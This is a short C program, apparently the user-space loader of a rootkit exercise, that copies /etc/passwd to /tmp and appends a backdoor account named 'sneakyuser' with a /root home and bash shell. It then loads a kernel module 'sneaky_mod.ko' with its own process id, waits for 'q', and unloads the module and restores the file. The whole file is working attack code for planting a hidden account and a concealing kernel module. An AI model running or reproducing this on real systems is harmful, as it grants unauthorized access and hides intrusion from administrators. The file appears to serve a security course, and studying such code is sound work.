#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void copyFile(){
    system("cp /etc/passwd /tmp");
}

void addPassWord(){
    //open the file 
    FILE *passwd = fopen("/etc/passwd", "a");
    if (passwd == NULL) {
        perror("Error when opening the file.");
        exit(EXIT_FAILURE);
    }
    //add new content
    const char *newLine = "sneakyuser:abc123:2000:2000:sneakyuser:/root:/bin/bash\n";
    fputs(newLine, passwd);
    fclose(passwd);
}

void loadModule(int pid){
    char command[256];
    snprintf(command, sizeof(command), "sudo insmod sneaky_mod.ko pid=%d", pid);
    system(command);
}

void removeModule(){
    system("rmmod sneaky_mod");
}

void restoreFile(){
    system("cp /tmp/passwd /etc");
}

int main (void){
    //print process id  
    int pid = getpid();
    printf("sneaky_process pid = %d\n", pid);
    //copy file
    copyFile();
    //add password
    addPassWord();
    //load the module 
    loadModule(pid);
    //while loop
    char c;
    do {
        c = getchar();
    } while (c != 'q' && c != EOF);
    //remove the module
    removeModule();
    //restore the file
    restoreFile();

    exit(EXIT_SUCCESS);
}